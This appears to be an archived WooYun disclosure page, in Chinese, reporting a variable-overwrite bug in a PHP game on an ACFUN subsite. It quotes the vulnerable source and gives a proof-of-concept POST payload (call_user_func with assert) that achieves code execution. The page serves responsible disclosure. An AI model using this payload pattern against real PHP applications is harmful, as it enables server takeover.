@@ -1,0 +1,353 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ACFUN分站再次GETSHELL变量覆盖漏洞分析与利用  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ACFUN分站再次GETSHELL变量覆盖漏洞分析与利用  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/N1ghtBird">N1ghtBird</a> 
+</li><li>提交时间：		2013-05-14 08:36</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-14：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-05-14：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-05-24：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-06-03：	细节向普通白帽子公开<br/>
+									2013-06-13：	细节向实习白帽子公开<br/>
+									2013-06-28：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">最近在学代码审计..找个软柿子下手= 3 =.<br />
+<br />
+感谢@t00000by57 提供的利用思路.</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">但常在河边走哪有不湿鞋？extract + global早晚是要出问题的..<br />
+<br />
+<br />
+<br />
+直接进入正题：<br />
+<br />
+\include\common.inc.php -Line12<br />
+<br />
+</p><pre><code>require GAME_ROOT.&#039;./include/global.func.php&#039;;<br />
+error_reporting(E_ALL);<br />
+set_error_handler(&#039;gameerrorhandler&#039;);<br />
+$magic_quotes_gpc = get_magic_quotes_gpc();<br />
+extract(gstrfilter($_COOKIE));<br />
+extract(gstrfilter($_POST));<br />
+$_GET = gstrfilter($_GET);<br />
+$_REQUEST = gstrfilter($_REQUEST);<br />
+$_FILES = gstrfilter($_FILES);//哈?<br />
+<br />
+require GAME_ROOT.&#039;./config.inc.php&#039;;</code></pre><p class='detail'><br />
+<br />
+后引入config避免覆盖重要变量.<br />
+<br />
+<br />
+<br />
+gstrfilter过滤:<br />
+<br />
+\include\global.inc.php -Line48<br />
+<br />
+</p><pre><code>function gstrfilter($str) {<br />
+	if(is_array($str)) {<br />
+		foreach($str as $key =&gt; $val) {<br />
+			$str[$key] = gstrfilter($val);<br />
+		}<br />
+	} else {		<br />
+		if($GLOBALS[&#039;magic_quotes_gpc&#039;]) {<br />
+			$str = stripslashes($str);<br />
+		}<br />
+		$str = str_replace(&quot;&#039;&quot;,&quot;&quot;,$str);//屏蔽单引号&#039;<br />
+		$str = str_replace(&quot;\\&quot;,&quot;&quot;,$str);//屏蔽反斜杠/<br />
+		$str = htmlspecialchars($str,ENT_COMPAT);//转义html特殊字符，即&quot;&lt;&gt;&amp;<br />
+	}<br />
+	return $str;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+重要变量靠&#039;现取现用&#039;再加上过滤就可以从一定程度上避免因为偷懒拼接sqlquery产生的问题了..至少在大部分代码中没问题..<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+关键在这里:<br />
+<br />
+\command.php -Line3<br />
+<br />
+</p><pre><code>require &#039;./include/common.inc.php&#039;;<br />
+//$t_s=getmicrotime();<br />
+//require_once GAME_ROOT.&#039;./include/JSON.php&#039;;<br />
+require GAME_ROOT.&#039;./include/game.func.php&#039;;<br />
+require config(&#039;combatcfg&#039;,$gamecfg);</code></pre><p class='detail'><br />
+<br />
+\command.php -Line92<br />
+<br />
+</p><pre><code>if($mode !== &#039;combat&#039; &amp;&amp; $mode !== &#039;corpse&#039; &amp;&amp; strpos($action,&#039;pacorpse&#039;)===false &amp;&amp; $mode !== &#039;senditem&#039;){<br />
+			$action = &#039;&#039;;<br />
+		}<br />
+		if($command == &#039;menu&#039;) {<br />
+			$mode = &#039;command&#039;;<br />
+			$action = &#039;&#039;;<br />
+		} elseif($mode == &#039;command&#039;) {<br />
+			if($command == &#039;move&#039;) {<br />
+				include_once GAME_ROOT.&#039;./include/game/search.func.php&#039;;<br />
+				move($moveto);<br />
+				if($coldtimeon){$cmdcdtime=$movecoldtime;}<br />
+			} elseif($command == &#039;search&#039;) {<br />
+				include_once GAME_ROOT.&#039;./include/game/search.func.php&#039;;<br />
+				search();<br />
+				if($coldtimeon){$cmdcdtime=$searchcoldtime;}<br />
+			} elseif(strpos($command,&#039;itm&#039;) === 0) {<br />
+				include_once GAME_ROOT.&#039;./include/game/item.func.php&#039;;<br />
+				$item = substr($command,3);<br />
+				itemuse($item);<br />
+				if($coldtimeon){$cmdcdtime=$itemusecoldtime;}<br />
+			} elseif(strpos($command,&#039;rest&#039;) === 0) {<br />
+				if($command==&#039;rest3&#039; &amp;&amp; !in_array($pls,$hospitals)){<br />
+					$log .= &#039;&lt;span class=&quot;yellow&quot;&gt;你所在的位置并非医院，不能静养！&lt;/span&gt;&lt;br&gt;&#039;;<br />
+				}else{<br />
+					$state = substr($command,4,1);<br />
+					$mode = &#039;rest&#039;;<br />
+				}<br />
+			} elseif($command == &#039;itemmain&#039;) {<br />
+				$mode = $itemcmd;<br />
+			} elseif($command == &#039;song&#039;) {<br />
+				$sname=trim(trim($art,&#039;【&#039;),&#039;】&#039;);<br />
+				include_once GAME_ROOT.&#039;./include/game/song.inc.php&#039;;<br />
+				//$log.=$sname;<br />
+				sing($sname);<br />
+			}elseif($command == &#039;sync&#039;) {<br />
+				include_once GAME_ROOT.&#039;./include/game/special.func.php&#039;;<br />
+				syncro($sp_cmd);<br />
+				$mode=&#039;command&#039;;<br />
+			}elseif($command == &#039;special&#039;) {<br />
+				if($sp_cmd == &#039;sp_word&#039;){<br />
+					include_once GAME_ROOT.&#039;./include/game/special.func.php&#039;;<br />
+					getword();<br />
+					$mode = $sp_cmd;<br />
+				}elseif($sp_cmd == &#039;sp_adtsk&#039;){<br />
+					include_once GAME_ROOT.&#039;./include/game/special.func.php&#039;;<br />
+					adtsk();<br />
+					$mode = &#039;command&#039;;<br />
+				}elseif($sp_cmd == &#039;sp_pbomb&#039;){<br />
+					$mode = &#039;sp_pbomb&#039;;<br />
+				}elseif($sp_cmd == &#039;sp_weapon&#039;){<br />
+					include_once GAME_ROOT.&#039;./include/game/special.func.php&#039;;<br />
+					weaponswap();<br />
+					$mode = &#039;command&#039;;<br />
+					if($coldtimeon){$cmdcdtime=$weaponswapcoldtime;}<br />
+				}elseif($sp_cmd == &#039;oneonone&#039;){<br />
+					$mode=&#039;oneonone&#039;;<br />
+				}elseif($sp_cmd == &#039;sp_skpts&#039;){<br />
+					include_once GAME_ROOT.&#039;./include/game/clubskills.func.php&#039;;<br />
+					calcskills($skarr);<br />
+					$p12[1]=1; $p12[2]=2;<br />
+					$mode=&#039;sp_skpts&#039;;<br />
+				}else{<br />
+					$mode = $sp_cmd;<br />
+				}<br />
+				<br />
+			} elseif($command == &#039;team&#039;) {<br />
+				include_once GAME_ROOT.&#039;./include/game/team.func.php&#039;;<br />
+				if($teamcmd == &#039;teamquit&#039;) {				<br />
+					teamquit();<br />
+				} else{<br />
+					teamcheck();<br />
+				}<br />
+			}<br />
+   //省略一部分..直接进入最后逻辑<br />
+		} elseif($mode == &#039;senditem&#039;) {<br />
+			include_once GAME_ROOT.&#039;./include/game/battle.func.php&#039;;<br />
+			senditem();<br />
+		} elseif($mode == &#039;combat&#039;) {<br />
+			include_once GAME_ROOT.&#039;./include/game/combat.func.php&#039;;<br />
+			combat(1,$command);<br />
+		} elseif($mode == &#039;rest&#039;) {<br />
+			include_once GAME_ROOT.&#039;./include/state.func.php&#039;;<br />
+			rest($command);<br />
+//		} elseif($mode == &#039;chgpassword&#039;) {<br />
+//			include_once GAME_ROOT.&#039;./include/game/special.func.php&#039;;<br />
+//			chgpassword($oldpswd,$newpswd,$newpswd2);<br />
+//		} elseif($mode == &#039;chgword&#039;) {<br />
+//			include_once GAME_ROOT.&#039;./include/game/special.func.php&#039;;<br />
+//			chgword($newmotto,$newlastword,$newkillmsg);<br />
+		} elseif($mode == &#039;corpse&#039;) {<br />
+			include_once GAME_ROOT.&#039;./include/game/itemmain.func.php&#039;;<br />
+			getcorpse($command);<br />
+		} elseif($mode == &#039;team&#039;) {<br />
+			include_once GAME_ROOT.&#039;./include/game/team.func.php&#039;;<br />
+			$command($nteamID,$nteamPass);//&lt;----------<br />
+		}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+team.func.php中存在两个方法,建立队伍function teammake($tID,$tPass)和加入队伍 function teamjoin($tID,$tPass)，依靠$command传来的指令选择，但是感觉像是程序员在偷懒的时候忘记了上面extract解包？<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">构造请求：<br />
+<br />
+$_POST[&#039;mode&#039;]=&#039;team&#039;，<br />
+<br />
+$_POST[&#039;command&#039;]=&#039;call_user_func&#039;，<br />
+<br />
+$_POST[&#039;nteamID&#039;]=&#039;assert&#039;，<br />
+<br />
+$_POST[&#039;nteamPass&#039;]=&#039;phpinfo()&#039;。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/14032338c9f5b3334a15b28d6ddd7c9c0553b625.png" target="_blank"><img src="../images/14032338c9f5b3334a15b28d6ddd7c9c0553b625.png" alt="20130514032312.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">别偷懒.. </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/N1ghtBird" title="N1ghtBird">N1ghtBird</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-023693" title="ACFUN分站再次GETSHELL变量覆盖漏洞分析与利用">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-05-14 09:19</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">已向大逃杀通报</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="23693";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
